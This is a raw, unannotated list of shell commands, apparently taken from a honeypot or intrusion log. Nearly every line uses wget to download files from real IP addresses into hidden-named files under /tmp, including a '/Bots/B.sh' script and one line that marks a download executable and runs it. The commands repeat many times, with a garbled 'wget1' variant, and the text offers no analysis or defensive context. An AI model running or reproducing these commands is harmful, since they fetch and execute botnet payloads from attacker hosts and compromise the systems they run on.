wget http://185.62.189.157/Bots/B.sh
wget http://221.229.172.44:81/g7d5 chmod +x g7d5 ./g7d5
wget http://185.62.189.157/Bots/B.sh
wget http://185.62.189.157/Bots/B.sh
wget http://212.92.127.196/.8 -O /tmp/..8
wget1 http://212.92.127.196/.8 -O /tmp/..8
wget http://212.92.127.196/.9 -O /tmp/..9
wget1 http://212.92.127.196/.9 -O /tmp/..9
wget http://212.92.127.196/.10 -O /tmp/..10
wget1 http://212.92.127.196/.10 -O /tmp/..10
wget http://212.92.127.196/.11 -O /tmp/..11
wget1 http://212.92.127.196/.11 -O /tmp/..11
wget http://212.92.127.196/.12 -O /tmp/..12
wget1 http://212.92.127.196/.12 -O /tmp/..12
wget1 http://212.92.127.196/.2 -O /tmp/..2
wget http://212.92.127.196/.3 -O /tmp/..3
wget1 http://212.92.127.196/.3 -O /tmp/..3
wget http://212.92.127.196/.4 -O /tmp/..4
wget1 http://212.92.127.196/.4 -O /tmp/..4
wget http://212.92.127.196/.5 -O /tmp/..5
wget1 http://212.92.127.196/.5 -O /tmp/..5
wget http://212.92.127.196/.6 -O /tmp/..6
wget1 http://212.92.127.196/.6 -O /tmp/..6
wget http://212.92.127.196/.7 -O /tmp/..7
wget1 http://212.92.127.196/.7 -O /tmp/..7
wget1 http://212.92.127.196/.1 -O /tmp/..1
wget http://212.92.127.196/.2 -O /tmp/..2
wget http://212.92.127.196/.1 -O /tmp/..1
wget http://212.92.127.196/.12 -O /tmp/..12
wget1 http://212.92.127.196/.12 -O /tmp/..12
wget1 http://212.92.127.196/.5 -O /tmp/..5
wget http://212.92.127.196/.6 -O /tmp/..6
wget1 http://212.92.127.196/.6 -O /tmp/..6
wget http://212.92.127.196/.7 -O /tmp/..7
wget1 http://212.92.127.196/.7 -O /tmp/..7
wget http://212.92.127.196/.8 -O /tmp/..8
wget1 http://212.92.127.196/.8 -O /tmp/..8
wget http://212.92.127.196/.9 -O /tmp/..9
wget1 http://212.92.127.196/.9 -O /tmp/..9
wget http://212.92.127.196/.10 -O /tmp/..10
wget1 http://212.92.127.196/.10 -O /tmp/..10
wget http://212.92.127.196/.11 -O /tmp/..11
wget1 http://212.92.127.196/.11 -O /tmp/..11
wget http://212.92.127.196/.1 -O /tmp/..1
wget1 http://212.92.127.196/.1 -O /tmp/..1
wget http://212.92.127.196/.2 -O /tmp/..2
wget1 http://212.92.127.196/.2 -O /tmp/..2
wget http://212.92.127.196/.3 -O /tmp/..3
wget1 http://212.92.127.196/.3 -O /tmp/..3
wget http://212.92.127.196/.4 -O /tmp/..4
wget1 http://212.92.127.196/.4 -O /tmp/..4
wget http://212.92.127.196/.5 -O /tmp/..5
wget -c http://180.97.220.28:8080/103771
wget -c http://180.97.220.28:8080/771
wget -c http://180.97.220.28:8080/771
wget -c http://192.169.180.138:55678/10991fuck
wget -c http://192.169.180.138:55678/10991fuck
wget http://212.92.127.196/.7 -O /tmp/..7
wget1 http://212.92.127.196/.7 -O /tmp/..7
wget http://212.92.127.196/.8 -O /tmp/..8
wget1 http://212.92.127.196/.8 -O /tmp/..8
wget http://212.92.127.196/.9 -O /tmp/..9
wget1 http://212.92.127.196/.9 -O /tmp/..9
wget http://212.92.127.196/.10 -O /tmp/..10
wget1 http://212.92.127.196/.10 -O /tmp/..10
wget http://212.92.127.196/.11 -O /tmp/..11
wget1 http://212.92.127.196/.11 -O /tmp/..11
wget http://212.92.127.196/.12 -O /tmp/..12
wget1 http://212.92.127.196/.12 -O /tmp/..12
wget http://212.92.127.196/.1 -O /tmp/..1
wget1 http://212.92.127.196/.1 -O /tmp/..1
wget http://212.92.127.196/.2 -O /tmp/..2
wget1 http://212.92.127.196/.2 -O /tmp/..2
wget http://212.92.127.196/.3 -O /tmp/..3
wget1 http://212.92.127.196/.3 -O /tmp/..3
wget http://212.92.127.196/.4 -O /tmp/..4
wget1 http://212.92.127.196/.4 -O /tmp/..4
wget http://212.92.127.196/.5 -O /tmp/..5
wget1 http://212.92.127.196/.5 -O /tmp/..5
wget http://212.92.127.196/.6 -O /tmp/..6
wget1 http://212.92.127.196/.6 -O /tmp/..6
wget http://212.92.127.196/.7 -O /tmp/..7
wget1 http://212.92.127.196/.7 -O /tmp/..7
wget http://212.92.127.196/.8 -O /tmp/..8
wget1 http://212.92.127.196/.8 -O /tmp/..8
wget http://212.92.127.196/.9 -O /tmp/..9
wget1 http://212.92.127.196/.9 -O /tmp/..9
wget http://212.92.127.196/.10 -O /tmp/..10
wget1 http://212.92.127.196/.10 -O /tmp/..10
wget http://212.92.127.196/.11 -O /tmp/..11
wget1 http://212.92.127.196/.11 -O /tmp/..11
wget http://212.92.127.196/.12 -O /tmp/..12
wget1 http://212.92.127.196/.12 -O /tmp/..12
wget http://212.92.127.196/.1 -O /tmp/..1
wget1 http://212.92.127.196/.1 -O /tmp/..1
wget http://212.92.127.196/.2 -O /tmp/..2
wget1 http://212.92.127.196/.2 -O /tmp/..2
wget http://212.92.127.196/.3 -O /tmp/..3
wget1 http://212.92.127.196/.3 -O /tmp/..3
